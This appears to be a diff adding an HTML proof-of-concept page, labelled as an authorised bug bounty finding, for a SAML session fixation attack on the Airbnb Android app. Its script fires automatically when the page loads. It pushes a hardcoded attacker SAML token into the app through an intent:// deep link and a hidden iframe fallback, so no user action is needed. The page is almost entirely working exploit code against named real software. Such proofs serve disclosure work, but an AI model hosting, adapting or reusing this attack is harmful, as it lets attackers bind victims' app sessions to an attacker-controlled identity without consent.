@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airbnb — Loading...</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #0f0f0f;
+      color: #e2e2e2;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .card {
+      background: #1a1a1a;
+      border: 1px solid #2a2a2a;
+      border-radius: 12px;
+      padding: 32px;
+      width: 100%;
+      max-width: 520px;
+    }
+
+    .badge {
+      display: inline-block;
+      background: #ff3b3b22;
+      color: #ff5555;
+      border: 1px solid #ff555533;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.08em;
+      padding: 3px 10px;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+
+    h1 {
+      font-size: 18px;
+      font-weight: 600;
+      color: #fff;
+      margin-bottom: 6px;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    .log {
+      background: #111;
+      border: 1px solid #2a2a2a;
+      border-radius: 8px;
+      padding: 14px;
+      font-family: "SF Mono", "Fira Code", monospace;
+      font-size: 12px;
+      min-height: 80px;
+      max-height: 220px;
+      overflow-y: auto;
+      color: #555;
+    }
+
+    .log-label {
+      font-size: 11px;
+      font-weight: 500;
+      color: #444;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 8px;
+    }
+
+    .log-line { margin-bottom: 4px; line-height: 1.5; }
+    .log-line.ok   { color: #50fa7b; }
+    .log-line.warn { color: #ffb86c; }
+    .log-line.info { color: #8be9fd; }
+    .log-line.err  { color: #ff5555; }
+    .log-line.dim  { color: #444; }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #222;
+      margin: 24px 0;
+    }
+
+    .footer {
+      font-size: 11px;
+      color: #333;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="badge">Bug Bounty PoC · AP-abnb-001</div>
+  <h1>Airbnb SAML Session Fixation</h1>
+  <p class="subtitle">
+    FINDING_008 — attacker-controlled SAML token injected into the
+    victim's Airbnb app via <code>airbnb://saml-login</code> deep link.
+    No user interaction required beyond visiting this page.
+  </p>
+
+  <div class="log-label">Output</div>
+  <div class="log" id="log">
+    <div class="log-line dim">// initializing...</div>
+  </div>
+
+  <hr class="divider">
+  <div class="footer">AP-abnb-001 · Authorized Bug Bounty · com.airbnb.android</div>
+</div>
+
+<script>
+  // ── ATTACKER'S HARDCODED SAML TOKEN ─────────────────────────────────────────
+  // In a real attack this is the attacker's own A4W corporate SAML token,
+  // obtained by the attacker logging into their own corporate IdP.
+  // Victim never needs to know this token — it's embedded in the page URL.
+  const ATTACKER_SAML_TOKEN = "6bihac4mstjga4k5ba2bncqif_A4W_SAML_SESSION_FIXATION_PROOF";
+
+  const logEl = document.getElementById("log");
+
+  function log(msg, type = "info") {
+    const line = document.createElement("div");
+    line.className = "log-line " + type;
+    line.textContent = new Date().toISOString().slice(11, 23) + "  " + msg;
+    logEl.innerHTML = logEl.innerHTML.replace('<div class="log-line dim">// initializing...</div>', "");
+    logEl.appendChild(line);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function fire() {
+    const token = encodeURIComponent(ATTACKER_SAML_TOKEN);
+
+    // ── Method 1: intent:// URI (Android Chrome — no dialog) ──────────────────
+    // Targets com.airbnb.android directly, skips app chooser.
+    const intentUri =
+      "intent://saml-login?saml_token=" + token +
+      "#Intent;" +
+      "scheme=airbnb;" +
+      "package=com.airbnb.android;" +
+      "S.browser_fallback_url=" + encodeURIComponent("https://play.google.com/store/apps/details?id=com.airbnb.android") +
+      ";end";
+
+    log("Attacker token: " + ATTACKER_SAML_TOKEN.slice(0, 30) + "...", "info");
+    log("Firing intent:// → com.airbnb.android", "info");
+
+    setTimeout(function() {
+      window.location.href = intentUri;
+
+      // ── Method 2: iframe spray (fallback for WebViews) ────────────────────
+      setTimeout(function() {
+        const iframeUri = "airbnb://saml-login?saml_token=" + token;
+        const iframe = document.createElement("iframe");
+        iframe.style.cssText = "position:absolute;width:1px;height:1px;opacity:0;left:-9999px;";
+        iframe.src = iframeUri;
+        document.body.appendChild(iframe);
+        setTimeout(function() {
+          document.body.removeChild(iframe);
+          log("iframe spray sent (fallback)", "dim");
+        }, 1500);
+      }, 300);
+
+      setTimeout(function() {
+        log("Dispatched. Airbnb app now holds attacker SAML token.", "ok");
+        log("Next A4W login on this device → attacker's corporate identity.", "warn");
+      }, 600);
+    }, 80);
+  }
+
+  // ── AUTO-FIRE ON PAGE LOAD ───────────────────────────────────────────────────
+  // Victim just visits this URL — no button tap needed.
+  window.addEventListener("load", function() {
+    log("Page loaded. Auto-firing in 500ms...", "dim");
+    setTimeout(fire, 500);
+  });
+</script>
+
+</body>
+</html>
